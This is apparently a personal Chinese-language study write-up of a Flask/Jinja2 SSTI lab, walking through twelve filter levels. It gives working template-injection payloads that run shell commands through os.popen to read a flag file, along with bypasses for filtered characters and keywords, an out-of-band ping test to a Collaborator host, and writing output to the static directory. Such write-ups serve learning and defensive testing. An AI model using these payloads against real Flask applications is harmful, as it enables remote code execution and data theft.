---
title: ssti-flask-labs
date: 2025-03-24 19:06:24
tags:
- ssti
category:
- 学习笔记
---

# ssti-flask-labs

**获取键值或下标的方式**

```
dict['__builtins__']
dict.__getitem__('__builtins__')
dict.pop('__builtins__')
dict.get('__builtins__')
dict.setdefault('__builtins__')
list[0]
list.__getitem__(0)
list.pop(0)
```

##### 获取属性的方式

```
().__class__
()["__class__"]
()|attr("__class__")
().__getattribute__("__class__")
```

---

## Level 1 无过滤

没有任何过滤，直接构造调用lipsum函数的os模块使用popen命令读取flag

payload：

```
code={{lipsum.__globals__['os'].popen('cat /app/flag').read()}}
```

---

## Level 2 双大括号'{{'过滤

```
{%%}可以用来声明变量，当然也可以用于循环语句和条件语句。
{{}}用于将表达式打印到模板输出
{##}表示未包含在模板输出中的注释
\##可以有和{%%}相同的效果
```

这关过滤了双大括号但是可以用`{%print%}`代替

```
`{{}} 等价于 {%print%}`
```

payload：

```
code={%25print lipsum.__globals__['os'].popen('cat /app/flag').read()%25}
```

注意在hackbar中提交需要对%进行url编码为%25

---

## Level 3 无过滤盲注

这题我们注入发现没有回显，只会显示hello correct和hello wrong

这里先用burpsuite的Collaborator模块试下能不能实现数据外带

```
code={lipsum.__globals__['os'].popen('ping j9toqnlcpkymmuv2y62tvzdvxm3drbf0.oastify.com').read()}
```

发现不出网

尝试写静态文件，flask有一个静态目录路径在/app/static

我们可以将flag中的内容cat出来然后写入到静态目录中，然后url去访问就能拿到flag

payload：

```
code={{lipsum.__globals__['os'].popen('echo `cat /app/flag` >/app/static/1.txt').read()}}
```

---

## Level 4 中括号过滤'['、']'

这里我们先用了一下之前的payload：

```
{{lipsum.__globals__['os'].popen('ls').read()}}
```

发现显示hello waf，说明中括号被过滤了

获取键值或下标

```
dict['__builtins__']
dict.__getitem__('__builtins__')
dict.pop('__builtins__')
dict.get('__builtins__')
dict.setdefault('__builtins__')
list[0]
list.__getitem__(0)
list.pop(0)
```

替换掉中括号]

payload：

```
code={{lipsum.__globals__.get('os').popen('cat /app/flag').read()}}
code={{lipsum.__globals__.__getitem__('os').popen('cat /app/flag').read()}}
```

---

## Level 5 双引号单引号过滤

这关过滤了双引号和单引号，可以用request绕过

```
先构造原payload
{{lipsum.__globals__.get('os').popen('cat /app/flag').read()}}

将引号部分替换为request.args.参数名

POST：code={{lipsum.__globals__.get(request.args.x1).popen(request.args.x2).read()}}
GET：?x1=os&x2=cat /app/flag
```

---

## Level 6 下划线过滤

这关过滤掉了下划线，这里有好几种绕过方法，这里就只写hex和unicode编码绕过了，（不建议用base64仅python2支持）

```


原payload：
{{lipsum.__globals__['os'].popen('cat /app/flag').read()}}

将下划线替换为十六进制编码\x5f
code={{lipsum['\x5f\x5fglobals\x5f\x5f']['os'].popen('cat /app/flag').read()}}

将下划线替换为unicode编码
code={{lipsum['\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f']['os'].popen('cat /app/flag').read()}}
```

---

## Level 7 点过滤

这关过滤了点'.'，可以用中括号构造没有点的payload：

```
code={{lipsum['__globals__']['os']['popen']('cat /app/flag')['read']()}}
```

---

## Level 8 class”, “arg”, “form”, “value”, “data”, “request”, “init”, “global”, “open”, “mro”, “base”, “attr”关键字过滤

这关过滤了很多关键字，我们可以使用拼接绕过

payload：

```
code={{lipsum['__glob'+'als__']['os']['pop'+'en']('cat /app/flag').read()}}

不用+号也可以
code={{lipsum['__glob''als__']['os']['pop''en']('cat /app/flag').read()}}
```

---

## Level 9 数字过滤

我们原来的payload就没有用数字

```
code={{lipsum.__globals__['os'].popen('cat /app/flag').read()}}
```

如果要用带数字的payload话，要用`{%%}+length`去构造数字

---

## Level 10 config直接调用过滤

这关看题目猜测flag在config配置信息中，但是这里过滤掉了直接调用config

```
code={{config}}
```

显示Hello code=None

这里可以调用current_app去取config

```
code={{url_for.__globals__['current_app'].config}}
```

---

## Level 11 过滤'\'', '"', '+', 'request', '.', '[', ']'

过滤了单引号和双引号、reuquest

**先考虑怎么获取字符串。**

可以通过过滤器|join返回字符串

**再考虑过滤了. []怎么取属性**

可以通过|attr()

**考虑怎么取键值**

通过`\_\_getitem\_\_('key')`

**然后用`{%set %}`拼接**

```
原payload：
{{lipsum.__globals__['os'].popen('ls').read()}}

a 构造__globals__
{%set a=dict(__glo=a,bals=a)|join%}

b 构造os
{%set b=dict(o=a,s=a)|join%}

c 构造popen
{%set c=dict(po=a,pen=a)|join%}

cmd 构造ls
{%set cmd=dict(l=a,s=a)|join%}

d 构造read
{%set d=dict(re=a,ad=a)|join%}

e 构造__getitem__
{%set e=dict(__ge=a,titem__=a)|join%}

f 构造__builtins__
{%set f=dict(__buil=a,tins__=a)|join%}

g 构造chr字符
{%set ch=dict(ch=a,r=a)|join%}

{{lipsum|attr(a)|attr(e)|attr(c)(cmd)|attr(d)()}}
```

就是

```
{%set a=dict(__glo=a,bals__=a)|join%}
{%set b=dict(o=a,s=a)|join%}
{%set c=dict(po=a,pen=a)|join%}
{%set cmd=dict(l=a,s=a)|join%}
{%set d=dict(re=a,ad=a)|join%}
{%set e=dict(__ge=a,titem__=a)|join%} 
{{lipsum|attr(a)|attr(e)(b)|attr(c)(cmd)|attr(d)()}}
```

成功执行

但是我们要读flag，目录路径有空格和斜杠。

可以用`['__builtins__']['chr']`函数 用ascii表转换为字符

字符转chr脚本 记下 32 为空格 47为斜杠

```
i= input("输入字符串:")
flag=""
for c in i:
    c= ord(c)
    b="chr(%d)" %(c)
    flag +=b+'%2b'
print(flag[0:-3:1])
```

修改payload

构造细节

```
{{lipsum.__globals__['os'].popen('ls').read()}}
a.构造__globals__
{%set a=dict(__glo=a,bals__=a)|join%}

b.构造os
{%set b=dict(o=a,s=a)|join%}

c.构造popen
{%set c=dict(po=a,pen=a)|join%}

cmd.构造ls
{%set cmd=dict(l=a,s=a)|join%}

d.构造read
{%set d=dict(re=a,ad=a)|join%}

e.构造__getitem__
{%set e=dict(__ge=a,titem__=a)|join%} 

f.构造__builtins__
{%set f=dict(__buil=a,tins__=a)|join%}

ch.构造 chr 字符
{%set ch=dict(ch=a,r=a)|join%}

chh.构造 chr 函数
{%set chh=lipsum|attr(a)|attr(e)(f)|attr(e)(ch)%}


```

最终payload：

```
code={%set a=dict(__glo=a,bals__=a)|join%}
{%set b=dict(o=a,s=a)|join%}
{%set c=dict(po=a,pen=a)|join%}
{%set d=dict(re=a,ad=a)|join%}
{%set e=dict(__ge=a,titem__=a)|join%} 
{%set f=dict(__buil=a,tins__=a)|join%}
{%set ch=dict(ch=a,r=a)|join%}
{%set chh=lipsum|attr(a)|attr(e)(f)|attr(e)(ch)%}
{%set cmd=(dict(ca=a,t=a)|join,chh(32),chh(47),dict(ap=a,p=a)|join,chh(47),dict(fl=a,ag=a)|join)|join%}
{{lipsum|attr(a)|attr(e)(b)|attr(c)(cmd)|attr(d)()}}
```

---

## Level 12 过滤‘_’, ‘.’, ‘0-9’, ‘\’, ‘’', ‘"’, ‘[’, ‘]’

在上题的基础上多过滤了下划线和数字

```
{%set nine=dict(aaaaaaaaa=a)|join|count%}
{%set fourseven=dict(aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa=a)|join|count%}
{%set eighteen=nine+nine%}
{%set pop=dict(pop=a)|join %}
{%set xiahuaxian=(lipsum|string|list)|attr(pop)(eighteen)%}
{%set globals=(xiahuaxian,xiahuaxian,dict(globals=a)|join,xiahuaxian,xiahuaxian)|join%}
{%set getitem=(xiahuaxian,xiahuaxian,dict(getitem=a)|join,xiahuaxian,xiahuaxian)|join%}
{%set space=(lipsum|string|list)|attr(pop)(nine)%}
{%set os=dict(os=a)|join%}
{%set popen=dict(popen=a)|join%}
{%set cat=dict(cat=a)|join%}
{%set read=dict(read=a)|join%}
{%set builtins=(xiahuaxian,xiahuaxian,dict(builtins=a)|join,xiahuaxian,xiahuaxian)|join%}
{%set ch=dict(ch=a,r=a)|join%}
{%set chr=lipsum|attr(globals)|attr(getitem)(builtins)|attr(getitem)(ch)%}
{%set cmd=(dict(ca=a,t=a)|join,space,chr(fourseven),dict(ap=a,p=a)|join,chr(fourseven),dict(fl=a,ag=a)|join)|join%}
{{lipsum|attr(globals)|attr(getitem)(os)|attr(popen)(cmd)|attr(read)()}}

```

